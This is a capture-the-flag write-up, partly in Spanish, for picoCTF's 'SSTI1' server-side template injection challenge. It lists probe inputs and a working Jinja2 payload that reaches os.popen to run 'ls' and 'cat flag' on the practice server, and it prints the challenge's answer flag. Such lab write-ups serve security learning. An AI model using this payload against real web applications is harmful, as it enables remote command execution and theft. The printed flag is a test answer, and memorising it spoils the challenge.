
## SSTI1
I made a cool website where you can announce whatever you want! Try it out!I heard templating is a cool and modular way to build web apps! Check out my website [here](http://rescued-float.picoctf.net:50752/)!

Hints:
1. Server Side Template Injection



## Solución
```

1. Entrar a la pagina:
[here](http://rescued-float.picoctf.net:50752/)!


2. Ingresar este código y darle ok
{{7*7}}



3. Ahora ingresar:  {{7*'7'}}

4. Ingresar después:  {{request}}
<Request 'http://rescued-float.picoctf.net:50752/announce' [POST]>


5. Ingresar:  {{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}

__pycache__ app.py flag requirements.txt




6. Ahora este: {{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}

picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_753eca43}

```

#### Bandera
```
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_753eca43}
```